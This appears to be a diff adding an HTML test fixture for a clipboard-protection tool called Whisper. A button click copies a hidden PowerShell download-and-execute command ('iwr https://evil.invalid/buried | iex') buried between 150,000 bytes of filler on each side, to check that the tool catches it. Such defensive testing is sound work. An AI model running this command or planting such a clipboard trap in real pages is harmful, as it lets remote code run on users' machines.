@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Payload buried in 300 KiB</title>
+<script src="common.js"></script></head>
+<body><h1>Payload buried in 300 KiB</h1>
+<button id="go">Continue</button>
+<script>
+// A command buried between 150000 bytes of shell-comment filler on each side. The
+// whole thing goes to the clipboard; Whisper must not let the middle slip through.
+const PAD = "# " + "x".repeat(150000);
+const PAYLOAD = 'powershell -w hidden -c "iwr https://evil.invalid/buried | iex"';
+const BIG = PAD + "\n" + PAYLOAD + "\n" + PAD;
+document.getElementById("go").addEventListener("click", () => window.__clipguard.writeText(BIG));
+</script>
+</body></html>
